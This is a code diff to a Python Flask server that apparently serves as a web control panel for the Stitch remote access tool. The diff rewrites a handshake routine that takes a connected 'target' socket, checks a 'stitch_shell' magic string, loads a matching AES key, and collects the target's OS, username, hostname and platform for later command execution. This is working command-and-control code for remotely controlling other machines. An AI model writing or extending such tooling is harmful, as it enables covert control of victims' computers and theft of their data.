@@ -1031,20 +1031,80 @@ def upload_file():
         log_debug(f"Error uploading file: {str(e)}", "ERROR", "Upload")
         return jsonify({'error': str(e)}), 500
 
-def _perform_handshake(sock, addr):
-    """Simplified working handshake"""
+def _perform_handshake(conn_id):
+    """Perform initial handshake with a newly connected target to obtain AES key and metadata,
+    storing results in connection_context."""
     try:
-        sock.settimeout(5)
-        # Accept any connection for now
-        data = sock.recv(1024)
-        if data:
-            logger.debug(f"Received: {data[:50]}")
-            sock.send(b"OK\n")
-            return True, None, "Connected"
-        return False, None, "No data"
+        server = get_stitch_server()
+        sock = server.inf_sock.get(conn_id)
+        if not sock:
+            return False, f"❌ Target {conn_id} is not connected"
+
+        # Confirm magic string (unencrypted) with small retry/backoff
+        confirm = None
+        expected = base64.b64encode(b'stitch_shell')
+        for attempt in range(3):
+            try:
+                confirm = server.receive(sock, encryption=False)
+                break
+            except Exception:
+                time.sleep(0.2 * (attempt + 1))
+        if confirm != expected:
+            log_debug(f"Handshake confirm mismatch for {conn_id}: got {confirm}", "WARNING", "Handshake")
+
+        # Receive AES identifier
+        aes_id = None
+        for attempt in range(3):
+            try:
+                aes_id_bytes = server.receive(sock, encryption=False)
+                aes_id = aes_id_bytes.decode('utf-8') if isinstance(aes_id_bytes, bytes) else aes_id_bytes
+                break
+            except Exception as e:
+                if attempt == 2:
+                    return False, f"❌ Handshake failed for {conn_id}: {str(e)}"
+                time.sleep(0.2 * (attempt + 1))
+
+        # Lookup AES key
+        aes_lib = configparser.ConfigParser()
+        aes_lib.read(st_aes_lib)
+        if aes_id not in aes_lib.sections():
+            return False, (
+                "❌ The target connection is using an encryption key not found in the AES library.\n"
+                "[*] Use the 'addkey' command to add encryption keys to the AES library."
+            )
+        aes_key_b64 = aes_lib.get(aes_id, 'aes_key')
+        try:
+            aes_key = base64.b64decode(aes_key_b64)
+        except Exception:
+            return False, "❌ Invalid AES key format in library"
+
+        # Receive metadata (encrypted)
+        try:
+            os_first = stitch_lib.st_receive(sock, aes_key, as_string=True)
+            os_second = stitch_lib.st_receive(sock, aes_key, as_string=True)
+            user = stitch_lib.st_receive(sock, aes_key, as_string=True)
+            hostname = stitch_lib.st_receive(sock, aes_key, as_string=True)
+            platform_str = stitch_lib.st_receive(sock, aes_key, as_string=True)
+        except Exception as e:
+            # On failure, clear any partial context and abort
+            connection_context.pop(conn_id, None)
+            return False, f"❌ Failed to receive handshake metadata: {str(e)}"
+
+        chosen_os = os_second or os_first or 'Unknown'
+        connection_context[conn_id] = {
+            'aes_key': aes_key,
+            'os': chosen_os,
+            'platform': platform_str,
+            'hostname': hostname or conn_id,
+            'user': user or 'Unknown',
+            'port': server.inf_port.get(conn_id, '4040'),
+            'connected_at': datetime.now().isoformat(),
+        }
+        log_debug(f"Handshake completed for {conn_id} ({chosen_os})", "INFO", "Handshake")
+        return True, connection_context[conn_id]
     except Exception as e:
-        logger.error(f"Handshake error: {e}")
-        return False, None, str(e)
+        return False, f"❌ Handshake error: {str(e)}"
+
 
 def execute_real_command(command, conn_id=None, parameters=None):
     """Execute command - REAL implementation, not simulated
